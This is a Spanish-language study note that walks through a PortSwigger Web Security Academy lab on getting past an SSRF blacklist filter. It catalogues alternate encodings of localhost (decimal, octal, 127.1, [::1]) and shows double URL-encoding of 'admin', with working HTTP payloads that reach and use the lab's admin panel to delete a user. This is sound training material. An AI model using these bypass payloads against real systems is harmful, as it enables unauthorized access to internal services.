---
aliases:
  - SSRF 003 - bypass blacklist
  - variantes de localhost
  - ssrf blacklist filter
tags:
  - vuln/ssrf
  - example
  - portswigger
---

# 003 — Saltar una blacklist (variantes de `localhost`)

> Lab: [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter) · **Practitioner** · técnica → [[vulnerabilities/007-ssrf/ssrf|entry point]]

## ¿Por qué acá?
- **Vengo de [[vulnerabilities/007-ssrf/examples/001-ssrf-directo-localhost|001]]:** el ataque es el mismo (apuntar a `localhost/admin`), pero ahora hay un **filtro**.
- **Por qué no me alcanza 001:** la blacklist **bloquea `localhost` y `127.0.0.1`**, y además la palabra **`admin`**. El payload directo rebota.
- **Entonces:** uso **otra representación de `127.0.0.1`** (la blacklist es literal) + **encoding** para colar la palabra `admin`.

## Variantes de `localhost` / `127.0.0.1` (catálogo)
Todas apuntan al loopback; la blacklist solo conoce las obvias:

| Representación | Valor |
| --- | --- |
| Forma corta | `http://127.1/` |
| Decimal | `http://2130706433/` |
| Octal | `http://017700000001/` |
| IPv6 loopback | `http://[::1]/` |
| Cero | `http://0/` (= 0.0.0.0 → loopback en muchos stacks) |
| Dominio propio → 127.0.0.1 | registrás un dominio que resuelve a `127.0.0.1` (o `spoofed.<tu-collaborator>`) |
| Mayúsculas mezcladas | `http://LOCALHOST/`, `http://127.0.0.1/ADMIN` |

> Para la **palabra filtrada** (`admin`): **doble URL-encode** una letra → `a` = `%2561` → `%2561dmin`. Si aún filtra, seguí encodeando.

## Cómo explotarlo
```http
POST /product/stock HTTP/1.1
Host: LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://127.1/%2561dmin
```
Confirmado el panel:
```http
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

## Verificación
Con `localhost` da error de filtro; con `127.1` + `%2561dmin` **vuelve el panel** → carlos borrado.

## Detalles que se pasan por alto
- **Blacklist = lista de "malos conocidos"** → siempre hay una forma que no está en la lista. Por eso funciona el catálogo de arriba.
- El **doble encoding** funciona cuando el **filtro decodifica una vez y el backend otra vez**.
- Combiná ambas cosas: representación alternativa del host **y** encoding de la ruta.

→ Siguiente: [[vulnerabilities/007-ssrf/examples/004-bypass-whitelist|004 · y si en vez de bloquear malos, solo permite UN dominio bueno?]]
